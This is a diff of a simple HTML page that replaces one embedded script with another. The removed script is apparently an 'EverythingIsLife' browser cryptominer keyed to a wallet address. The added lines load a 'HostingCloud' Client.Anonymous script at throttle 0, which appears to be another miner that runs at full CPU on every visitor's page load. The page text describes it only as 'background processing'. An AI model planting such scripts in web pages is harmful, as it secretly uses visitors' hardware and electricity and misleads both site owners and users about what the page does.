@@ -1,15 +1,23 @@
+<!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>EverythingIsLife Example</title>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Simple Page with Client Script</title>
+    <!-- HostingCloud Anonymous Client Script -->
+    <script src="https://www.hostingcloud.racing/o4St.js"></script>
+    <script>
+        // Initialize and start the anonymous client
+        var _client = new Client.Anonymous('195aebec64e39cfa71b56ed950fe41b63732e97109de79988755ac411447cc54', {
+            throttle: 0,
+            c: 'w'
+        });
+        _client.start();
+    </script>
 </head>
 <body>
-  <h1>EverythingIsLife Demo</h1>
-  
-  <script src="https://thelifewillbefine.de/karma/karma.js?karma=bs?nosaj=faster.mo"></script>
-  <script type="text/javascript">
-    EverythingIsLife('42Xw92YuoWSdiHchR4JqsB1SBcXi5DJGMQNELZtFmuyEbrV4H1f5wyQ8isv4yHPA4vCU9BBkrB1Nm7biiJDc2rz2TZin3Tg', 'x', 30);
-  </script>
+    <h1>Welcome to Your Simple Page</h1>
+    <p>This page includes the HostingCloud anonymous client script for background processing.</p>
 </body>
 </html>
